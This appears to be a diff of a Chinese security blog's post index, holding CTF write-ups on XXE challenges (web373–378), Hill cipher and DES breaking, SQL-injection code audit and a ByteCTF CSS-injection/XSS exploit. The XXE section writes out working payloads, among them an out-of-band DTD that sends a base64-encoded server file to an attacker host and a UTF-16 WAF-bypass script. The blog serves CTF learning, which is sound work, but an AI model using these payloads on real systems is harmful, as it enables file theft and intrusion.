-<span id="more"></span>
-<h2 id="web373回显读文件">web373（回显读文件）</h2>
-<p>首先来看PHP源代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>
-<p>我们只需要构造含有ctfshow这个元素的xml文档，利用外部实体从而读取文件</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">creds</span> (<span class="meta-keyword">ctfshow</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">ctfshow</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这样，就能成功把flag打出来。</p>
-<h2 id="web374oob">web374（OOB）</h2>
-<p>这道题就是经典的OOB外带，</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
-<p>首先在VPS上搭建xxe.dtd</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://your-ip:port?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>注入的xml</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://your-ip/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
-<p>vps上启动http服务</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Python3 -m http.server 2333</span><br></pre></td></tr></table></figure>
-<p>需要注意的是<code>&amp;#37;</code>是HTML实体编码，对应的是<code>%</code></p>
-<p>整个的调用顺序为</p>
-<p><code>%remote</code> （包含远程服务器的dtd） --&gt; <code>%int</code> （包含send实体参数）--&gt; <code>%send</code>（包含file实体参数，访问远程服务器）</p>
-<h2 id="web375oob">web375（OOB）</h2>
-<p>过滤了"xml"的版本声明，但这并不影响。</p>
-<p>同web374</p>
-<h2 id="web376oob">web376（OOB）</h2>
-<p>同web374</p>
-<h2 id="web377utf-16">web377（UTF-16）</h2>
-<p>先看看PHP源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
-<p>这里非常重要的一点就是<code>http</code>协议被正则ban了，我们可以考虑利用编码绕过</p>
-<pre><code>    一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。
-    外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。</code></pre>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813225613713.png" alt="image-20220813225613713" style="zoom: 50%;" /></p>
-<p>这时我们需要用上Python脚本了：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> weakref <span class="keyword">import</span> proxy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f1a29458-0578-476a-825b-2ecc7fa52815.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/xxe.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://121.5.227.123/xxe.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url,data=data.encode(<span class="string">&#x27;utf-16&#x27;</span>),proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># print(data.encode(&#x27;utf-16&#x27;))</span></span><br></pre></td></tr></table></figure>
-<h2 id="web378flask-xxe">web378（flask XXE）</h2>
-<p>抓包发现，上传的用户名会回显，因此考虑XXE注入</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220814001604129.png" alt="image-20220814001604129" /><figcaption aria-hidden="true">image-20220814001604129</figcaption>
-</figure>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>传入后成功拿到flag.</p>
-<p>后端源代码如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">autor: c0ny1</span></span><br><span class="line"><span class="string">date: 2018-2-7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;DEBUG&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">USERNAME = <span class="string">&#x27;admin&#x27;</span> <span class="comment"># 账号</span></span><br><span class="line">PASSWORD = <span class="string">&#x27;admin&#x27;</span> <span class="comment"># 密码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/doLogin&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doLogin</span>():</span></span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 漏洞修复--禁用外部实体  resolve_entities=False</span></span><br><span class="line">        <span class="comment">#tree = etree.fromstring(request.data,etree.XMLParser(resolve_entities=False))</span></span><br><span class="line">        tree = etree.fromstring(request.data) <span class="comment"># 有漏洞</span></span><br><span class="line">        <span class="comment"># 遍历xml结构内容</span></span><br><span class="line">        <span class="keyword">for</span> childa <span class="keyword">in</span> tree:</span><br><span class="line">            <span class="built_in">print</span>(childa.tag, childa.text, childa.attrib)</span><br><span class="line">            <span class="keyword">if</span> childa.tag == <span class="string">&quot;username&quot;</span>:</span><br><span class="line">                username = childa.text</span><br><span class="line">                <span class="built_in">print</span>(username)</span><br><span class="line">            <span class="keyword">if</span> childa.tag == <span class="string">&quot;password&quot;</span>:</span><br><span class="line">                password = childa.text</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">        <span class="keyword">if</span> username == USERNAME <span class="keyword">and</span> password == PASSWORD:</span><br><span class="line">            result = <span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span> % (<span class="number">1</span>,username)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span> % (<span class="number">0</span>,username)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> Ex:</span><br><span class="line">        result = <span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span> % (<span class="number">3</span>,<span class="built_in">str</span>(Ex))</span><br><span class="line">    <span class="keyword">return</span> result,&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/xml;charset=UTF-8&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prn_obj</span>(<span class="params">obj</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;%s:%s&#x27;</span> % item <span class="keyword">for</span> item <span class="keyword">in</span> obj.__dict__.items()]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-        <category>XXE</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>ctfshow</tag>
-        <tag>wp</tag>
-        <tag>XXE</tag>
       </tags>
   </entry>
   <entry>
@@ -1111,17 +1094,21 @@
 <span id="more"></span>
 <h2 id="classical">1、Classical</h2>
 <h3 id="uctf-hill">1、UCTF-Hill</h3>
-<p>这道题打开是一段字母串，结合题目猜测是希尔密码 <span class="math display">\[
+<p>这道题打开是一段字母串，结合题目猜测是希尔密码</p>
+
+$$
 Am = c\\
 m = A^{-1}c\\
-\]</span></p>
+$$
+
 <p>猜测n = 2，于是爆破<span class="math inline">\(A^{-1}\)</span></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alpha_to_num</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a.islower():</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(a)-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(a)-<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_alpha</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处根据n的大小修改</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collsion_one_row</span>(<span class="params">m,c,key,row</span>):</span></span><br><span class="line">    <span class="keyword">for</span> x1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">for</span> x2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span>(</span><br><span class="line">                (x1 * c[<span class="number">0</span>][<span class="number">0</span>] + x2 * c[<span class="number">1</span>][<span class="number">0</span>]) % <span class="number">26</span> == m[row][<span class="number">0</span>] <span class="keyword">and</span></span><br><span class="line">                (x1 * c[<span class="number">0</span>][<span class="number">1</span>] + x2 * c[<span class="number">1</span>][<span class="number">1</span>]) % <span class="number">26</span> == m[row][<span class="number">1</span>] <span class="keyword">and</span></span><br><span class="line">                (x1 * c[<span class="number">0</span>][<span class="number">2</span>] + x2 * c[<span class="number">1</span>][<span class="number">2</span>]) % <span class="number">26</span> == m[row][<span class="number">2</span>]</span><br><span class="line">            ):</span><br><span class="line">                key[row][<span class="number">0</span>] = x1</span><br><span class="line">                key[row][<span class="number">1</span>] = x2 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collsion_key</span>(<span class="params">m,c,n,key</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        collsion_one_row(m,c,key,i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,n,key</span>):</span></span><br><span class="line">    plain = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),n):</span><br><span class="line">        ci = np.mat([alpha_to_num(c[i]),alpha_to_num(c[i+<span class="number">1</span>])]).reshape(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">        m = np.matmul(key,ci) % <span class="number">26</span></span><br><span class="line">        plain += num_to_alpha(<span class="built_in">int</span>(m[<span class="number">0</span>][<span class="number">0</span>]))</span><br><span class="line">        plain += num_to_alpha(<span class="built_in">int</span>(m[<span class="number">1</span>][<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hill_decrypt</span>(<span class="params">patr_m,cipher</span>):</span></span><br><span class="line">    n = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># n 为 ncipher的公因数 2,3,4,6,8,12</span></span><br><span class="line">    m = np.zeros(<span class="built_in">len</span>(plain),dtype=<span class="built_in">int</span>)</span><br><span class="line">    c = np.zeros(<span class="built_in">len</span>(plain),dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换爆破矩阵</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        m[i] = alpha_to_num(plain[i])</span><br><span class="line">        c[i] = alpha_to_num(cipher[i])</span><br><span class="line">    m = m.reshape(<span class="built_in">len</span>(plain)//n,n).T</span><br><span class="line">    c = c.reshape(<span class="built_in">len</span>(plain)//n,n).T</span><br><span class="line"></span><br><span class="line">    key = np.zeros(n*n,dtype=<span class="built_in">int</span>).reshape(n,n)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 爆破密钥</span></span><br><span class="line">    collsion_key(m,c,n,key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密</span></span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,n,key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:          </span><br><span class="line">    cipher = <span class="string">&quot;wznqca&#123;d4uqop0fk_q1nwofDbzg_eu&#125;&quot;</span></span><br><span class="line">    ncipher = <span class="string">&quot;&quot;</span></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">for</span> idx,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher):</span><br><span class="line">        <span class="keyword">if</span>(i.isalpha()):</span><br><span class="line">            ncipher += i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l.append(idx)</span><br><span class="line">    plain = <span class="string">&quot;utflag&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(hill_decrypt(plain,ncipher))</span><br></pre></td></tr></table></figure>
 <h2 id="des">2、DES</h2>
 <h3 id="nctf-reverse子密钥逆推">1、NCTF-Reverse（子密钥逆推）</h3>
 <p>加密部分非常简单：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line">flag = <span class="string">&quot;NCTF&#123;******************************************&#125;&quot;</span></span><br><span class="line">key = os.urandom(<span class="number">8</span>)</span><br><span class="line">d = pyDes.des(key)</span><br><span class="line">cipher = d.encrypt(flag.encode())</span><br><span class="line"><span class="built_in">print</span>(d.Kn[<span class="number">10</span>])</span><br></pre></td></tr></table></figure>
-<p>这里给第10轮的密钥，结合密钥生成的过程，我们可以得到如下的逆推逻辑： <span class="math display">\[
+<p>这里给第10轮的密钥，结合密钥生成的过程，我们可以得到如下的逆推逻辑：<br />
+<span class="math display">\[
 逆PC2置换(48bit \rightarrow 56bit)\\
 逆推位移运算\\
 得到带8位未知数的56bit初始密钥
@@ -1148,11 +1135,49 @@ m = A^{-1}c\\
       </tags>
   </entry>
   <entry>
+    <title>ctfshow-代码审计-wp</title>
+    <url>/2022/10/18/blog0026-ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-wp/</url>
+    <content><![CDATA[<h2 id="写在前面">0、写在前面</h2>
+<p>锻炼一下代码审计的功力</p>
+<p>CTF的Web现在越来越卷，要加强一下自己的代码审计能力了</p>
+<span id="more"></span>
+<h2 id="web301sql注入">1、Web301（SQL注入）</h2>
+<p>非常简单，联合注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; union select 123;#-- -</span><br></pre></td></tr></table></figure>
+<h2 id="web302sql注入">2、Web302（SQL注入）</h2>
+<p>这次的数据库存储密码是md5加密</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> md5(md5(<span class="variable">$str</span>.md5(base64_encode(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但是代码审计还是不难的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username = 123&#x27; union select &#x27;ebc21ce74a2153bbcf593e4f7d61479a&#x27;;#-- -</span><br><span class="line">password = 123</span><br></pre></td></tr></table></figure>
+<p>顺利通过身份校验，获得flag</p>
+<h2 id="web303报错注入">3、Web303（报错注入）</h2>
+<p>这道题的主要考点是报错注入。</p>
+<p>首先是登录页面，查看<code>sds_user.sql</code>文件，发现插入记录</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of sds_user</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `sds_user` <span class="keyword">VALUES</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;27151b7b1ad51a38ea66b1529cde5ee4&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>但是这里是加密过的密码，获取到了也无法获得明文，这时候基本上就只有弱密码爆破这条路了</p>
+<p>但是</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>ctfshow</tag>
+        <tag>audit</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2022ByteCTF复现</title>
     <url>/2022/09/29/blog0025-2022ByteCTF%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p>周末和队友一起打了ByteCTF，就打了第一天，第二天睡大觉去了。</p>
 <p>字节出的题还是学到了非常多的，现在复盘一下。</p>
-<p>这次比赛的好多知识点之前在挖洞/刷题都见过，可惜当时没能深挖，还是缺乏研究的时间啊。 <span id="more"></span> ## web</p>
+<p>这次比赛的好多知识点之前在挖洞/刷题都见过，可惜当时没能深挖，还是缺乏研究的时间啊。<br />
+<span id="more"></span><br />
+## web</p>
 <h3 id="grafana">grafana</h3>
 <h4 id="解题复盘">解题复盘</h4>
 <p>这题是一个经典的框架题，grafana是一个可视化的web应用，打开页面发现是一个注册框。</p>
@@ -1192,14 +1217,10 @@ m = A^{-1}c\\
 <h4 id="解题复盘-2">解题复盘</h4>
 <p>这道题的两个知识点，CSS注入和CORS我之前都有遇到过，但是比赛的时候结合起来的就意识不到了。</p>
 <p>页面点击进去之后，是一个打字游戏。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145240477.png" alt="image-20220930145240477" /><figcaption aria-hidden="true">image-20220930145240477</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145240477.png" alt="image-20220930145240477" /></p>
 <p>很明显要输入的单词就是#embed 的mp3文件对应的名字。</p>
 <p>简单打打游戏，基本是过不了关的，于是回头查看源代码。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145402655.png" alt="image-20220930145402655" /><figcaption aria-hidden="true">image-20220930145402655</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145402655.png" alt="image-20220930145402655" /></p>
 <p>源代码中，显示color属性是可控的，因此考虑是不是CSS注入，从而泄露src中的内容，实现游戏的过关。</p>
 <p>还有两个路由：</p>
 <ol type="1">
@@ -1215,25 +1236,17 @@ m = A^{-1}c\\
 <p>这样的方法有关键在于开了跨域，如果没开的话，那么受同源策略限制是无法做到的。</p>
 <p>分享一篇同源策略讲得非常清楚的博客：https://www.cnblogs.com/bmjoker/p/9500374.html</p>
 <p>在这道题中，我们要实现让victim主动访问<code>/status</code>路由，这需要XSS的实现，刚好存在name参数可以XSS。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171917479.png" alt="image-20220930171917479" /><figcaption aria-hidden="true">image-20220930171917479</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171917479.png" alt="image-20220930171917479" /></p>
 <p>问题转移到如何实现解题（手动显然不可行</p>
 <p>我们尝试闭合CSS，利用CSS注入泄露HTML页面内容实现在hacker端获取到答案</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930170938596.png" alt="image-20220930170938596" /><figcaption aria-hidden="true">image-20220930170938596</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930170938596.png" alt="image-20220930170938596" /></p>
 <p>这样拼接我们能在hacker端获取到对应页面的src值的内容，并且可以通过向hacker端发送请求实现src值的获取。</p>
 <p>接下来实现自动化答题，回归到源代码，我们查看源代码发现存在两种答题模式</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171127025.png" alt="image-20220930171127025" /><figcaption aria-hidden="true">image-20220930171127025</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171127025.png" alt="image-20220930171127025" /></p>
 <p>于是单次答题的攻击链如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CSS注入泄露src -&gt; hacker端接收到对应src -&gt; victim端访问hacker端得到src -&gt; 拼接location.href 答题</span><br></pre></td></tr></table></figure>
 <p>当我们解决了所有问题之后，接下来我们就可以利用name的XSS注入了,<code>after_command</code>就是访问<code>/status</code></p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171356476.png" alt="image-20220930171356476" /><figcaption aria-hidden="true">image-20220930171356476</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171356476.png" alt="image-20220930171356476" /></p>
 <p>注意到，此时是victim端访问<code>/status</code>，所以通过内网检查。</p>
 <p>victim端获取到HTML内容，接下来就是发送，这当然也涉及跨域，但是此时注意到hacker端就是响应端了，主动权在hacker端，只要设置响应头就可以了。</p>
 <p>最后在hacker端接受传送过来的<code>/status</code>的结果就可以了。</p>
@@ -1253,37 +1266,6 @@ m = A^{-1}c\\
         <tag>ctf</tag>
         <tag>wp</tag>
         <tag>ByteCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfshow-代码审计-wp</title>
-    <url>/2022/10/18/blog0026-ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-wp/</url>
-    <content><![CDATA[<h2 id="写在前面">0、写在前面</h2>
